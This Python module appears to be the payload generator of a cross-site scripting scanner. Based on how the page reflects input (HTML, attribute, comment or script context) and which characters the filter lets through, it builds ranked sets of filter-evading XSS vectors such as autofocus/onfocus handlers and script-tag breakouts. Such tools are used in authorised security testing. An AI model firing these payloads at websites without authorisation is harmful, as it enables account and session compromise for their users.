from core.jsContexter import jsContexter
from core.utils import randomUpper as r, genGen, extractScripts
from core.config import badTags, fillings, eFillings, lFillings, jFillings, eventHandlers, tags, functions

def generator(occurences, response):
    scripts = extractScripts(response)
    index = 0
    vectors = {10 : set(), 9 : set(), 8 : set(), 7 : set(), 6 : set(), 5 : set(), 4 : set(), 3 : set(), 2 : set(), 1 : set()}
    for i in occurences:
        context = occurences[i]['context'][0]
        breaker = occurences[i]['context'][1]
        special = occurences[i]['context'][2]
        if special not in badTags:
            special = ''
        elif context == 'attribute':
            special = '</' + special + '/>'
        else:
            special = ''
        attribute = occurences[i]['context'][3]
        if context == 'html':
            lessBracketEfficiency = occurences[i]['score']['<']
            greatBracketEfficiency = occurences[i]['score']['>']
            breakerEfficiency = occurences[i]['score'][breaker]
            if breaker == '\'' or breaker == '"':
                breaker = ''
                breakerEfficiency = 100
            ends = ['//']
            if greatBracketEfficiency == 100:
                ends.append('>')
            if lessBracketEfficiency == breakerEfficiency == 100:
                payloads = genGen(fillings, eFillings, lFillings, eventHandlers, tags, functions, ends, breaker, special)
                for payload in payloads:
                    vectors[10].add(payload)
        elif context == 'attribute':
            breakerEfficiency = occurences[i]['score'][breaker]
            greatBracketEfficiency = occurences[i]['score']['>']
            ends = ['//']
            if greatBracketEfficiency == 100:
                ends.append('>')
            if greatBracketEfficiency == 100 and breakerEfficiency == 100:
                payloads = genGen(fillings, eFillings, lFillings, eventHandlers, tags, functions, ends, breaker, special)
                for payload in payloads:
                    if breaker:
                        payload = payload.replace(breaker, breaker + '>')
                    else:
                        payload = '>' + payload
                    vectors[10].add(payload)
            if breakerEfficiency == 100:
                for filling in fillings:
                    for function in functions:
                        vector = breaker + filling + 'auTOfOcuS' + filling + 'OnFoCUs' + '=' + breaker + function
                        vectors[6].add(vector)
        elif context == 'comment':
            lessBracketEfficiency = occurences[i]['score']['<']
            greatBracketEfficiency = occurences[i]['score']['>']
            breakerEfficiency = occurences[i]['score'][breaker]
            ends = ['//']
            if greatBracketEfficiency == 100:
                ends.append('>')
            if lessBracketEfficiency == breakerEfficiency == 100:
                payloads = genGen(fillings, eFillings, lFillings, eventHandlers, tags, functions, ends, breaker, special)
                for payload in payloads:
                    vectors[10].add(payload)
        elif context == 'script':
            try:
                script = scripts[index]
            except IndexError:
                script = scripts[0]
            closer = jsContexter(script)
            validBreakers = ['\'', '"', '`']
            scriptEfficiency = occurences[i]['score']['</scRipT/>']
            greatBracketEfficiency = occurences[i]['score']['>']
            breakerEfficiency = occurences[i]['score'][breaker]
            ends = ['//']
            if greatBracketEfficiency == 100:
                ends.append('>')
            if scriptEfficiency == 100:
                breaker = r('</script/>')
                payloads = genGen(fillings, eFillings, lFillings, eventHandlers, tags, functions, ends, breaker, special)
                for payload in payloads:
                    vectors[10].add(payload)
            if closer:
                suffix = '//\\'
                if not breaker:
                    closer = closer[1:]
                for filling in jFillings:
                    for function in functions:
                        vector = breaker + closer + filling + function + suffix
                        vectors[7].add(vector)
            elif breakerEfficiency >= 83:
                suffix = '//'
                for filling in jFillings:
                    for function in functions:
                        if '=' in function:
                            function = '(' + function + ')'
                        if breaker == '':
                            filling = ''
                        vector = '\\' + breaker + closer + filling + function + suffix
                        vectors[6].add(vector)
            index += 1
    return vectors